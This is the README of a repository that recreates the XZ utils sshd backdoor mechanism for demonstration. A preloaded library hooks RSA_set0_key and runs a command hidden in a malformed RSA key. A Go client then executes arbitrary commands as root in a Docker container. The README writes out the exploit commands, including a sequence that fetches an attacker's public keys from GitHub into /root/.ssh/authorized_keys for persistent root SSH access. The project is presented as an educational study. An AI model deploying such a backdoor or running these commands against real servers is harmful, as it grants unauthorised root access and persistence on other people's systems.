# XZ utils backdoor

This repository aims to show how the [XZ utils backdoor](https://en.wikipedia.org/wiki/XZ_Utils_backdoor) worked. This repo focusses on how to malicious code is loaded during runtime, not on how it was hidden in the liblzma library. It is not an exact replication with the affected source code, but instead a malicious library is force loaded when running sshd. In the real attack the malicious code was loaded by the liblzma library, resulting in a supply chain attack. This repository uses its own malicious library to simplify things a bit, and to make it more clear how the attack works. So while it is not identical to the real attack, it does use exactly the same mechanics. Another reason to do this is versions. Since the discovery of the backdoor a lot of new versions of sshd have been release. Since the signature of the source code changed quite a bit, the old attack will not work with the new version of sshd, but by creating our own, we can tailor it to the current latest version of sshd.

## The attack

The way the original attack worked was by overriding a signature of a method another library. This was done by changing its address in the Global Offset Table, causing it to be called instead of the original. In this method there was a check for a specific pattern in the key. If this specific key was not found it would just call the original method and behave normally. However if the pattern was detected in the key, it would decode the key, retrieving the payload. It would then execute this payload as a command. Since this part of sshd runs as root, this allowed for root access on the victim machine.

In this demo we don't override the method by modifying on of the dependencies of sshd, but instead forcing it to load our own library. This library will then override the `RSA_set0_key` method from the openssl library. The sshd process will the call our method instead of the original, and the attack will be executed. To allow our attack to be stealthy and only trigger for the attacker, we create a modified RSA key. This RSA key has a modulus that is impossible to exist in a valid RSA key. This way it only triggers for us, since nobody else will use a invalid key.

## RSA key
For an explanation on how the payload is encoded into the RSA key, please see the report.

## The demo

To run the demo we use openssh-portable. We run it while forcing it to load our compiled rust library. The we use the Go client to connect with the correct RSA key.

### Dependencies

The easiest way to install all dependencies is with the nix package manager. Just run `nix-shell shell.nix` in the root of the project. This install rust and go only in that current shell. Rust is only needed if you are intending to change the trigger library. It is also required to have a running docker installed and running.

### Building

To build the docker image for the container that will run ssh-server, run `docker build --tag vulnerable_ssh_server .` This will build the rust library, compile openssh-portable from source and setup a user and directory ssh-server needs to run. For more information about what is happening check out the [Dockerfile](./Dockerfile).

### Running

Now run the container with `docker run --rm -it -p "2222:2222" --name vulnerable_ssh_server vulnerable_ssh_server:latest`. This will start sshd while preloading our library.

### The client

To now exploit the vulnerable server use the go script

In the ssh_backdoor_client folder run:

```
go run . -cmd "id > /tmp/exploit" -addr 127.0.0.1:2222 -usr root
```

You can change the command and address to whatever you like to use.
The user should be an existing user on the system sshd is running on, and should not be locked

### Verify

To check the exploit works we can now check out the file system of the docker contain. Run `docker exec -it vulnerable_ssh_server /bin/bash` exec into the container and run `cat /tmp/exploit`. You should see the output of the `id` command for the root user. You can further experiment with this and try to use different commands.

Because the entire command is decoded into the rsa key, the command has a maximum length of 64 characters. However every command can be executed by slowly building a command in a file, and executing that file. The following is a demonstration on how to gain real ssh-root access. Add a bit of time between these commands, because sshd will add a time penalty if there are to many attempts in a short time. If you have the docker container logs open you will be able to see when something is successful and when not based on the logs.

```
go run . -cmd "echo -n \"curl https://github.com\" >> /tmp/s"
go run . -cmd "echo -n \"/LuukBlankenstijn.keys \" >> /tmp/s"
go run . -cmd "echo \">> /root/.ssh/authorized_keys\" >> /tmp/s"


# wait ten seconds
go run . -cmd "mkdir -p /root/.ssh"
go run . -cmd "touch /root/.ssh/authorized_keys"
go run . -cmd "apt update && apt install -y curl"

#wait ten seconds
go run . -cmd "chmod +x /tmp/s"
go run . -cmd "/tmp/s"
```

After this all runs you will now be able to ssh into the container on port 2222: `ssh root@127.0.0.1 -p2222`. Remember to change the LuukBlankenstijn.keys for your own username on GitHub.
